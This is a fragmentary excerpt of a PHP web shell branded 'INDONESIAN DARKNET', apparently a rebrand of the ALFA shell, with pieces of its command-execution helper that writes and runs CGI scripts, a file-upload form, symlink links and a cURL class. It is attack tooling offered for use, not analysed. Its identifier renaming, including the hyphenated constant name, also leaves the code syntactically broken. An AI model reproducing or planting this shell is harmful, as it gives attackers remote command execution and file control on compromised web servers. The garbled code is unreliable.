...
<?php
/*
	Author: 	INDONESIANDARKNET
	Telegram: 	ANONYMOUS
	YouTube: 	https://youtube.com/ghostemane
	Gmail:		ANONYMOUS
	Date:		since 2016
*/
...
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ INDONESIAN DARKNET 2016'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$cgi_url = __INDONESIAN-DARKNET__."/alfacgiapi/".$lang.$cgi_ext;
...
echo '<html>';
echo "<title>INDONESIAN DARKNET</title>";
...
<title>..:: '.$_SERVER['HTTP_HOST'].' INDONESIAN DARKNET'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
function alfaWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __INDONESIAN-DARKNET__);
	}
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ INDONESIAN DARKNET &copy; 2016-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC:");' style='color: #E91E63;text-decoration: none;'>WE ARE RICH</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>ANONYMOUS</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='ANONYMOUS'>@DARKNET</a></span></div></td>
</tr>
</table>
</div>
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __INDONESIAN-DARKNET__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__INDONESIAN-DARKNET__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
@chmod($name,0755);
echo '<iframe src="'.__INDONESIAN-DARKNET__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
return('<iframe src="'.__INDONESIAN-DARKNET__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
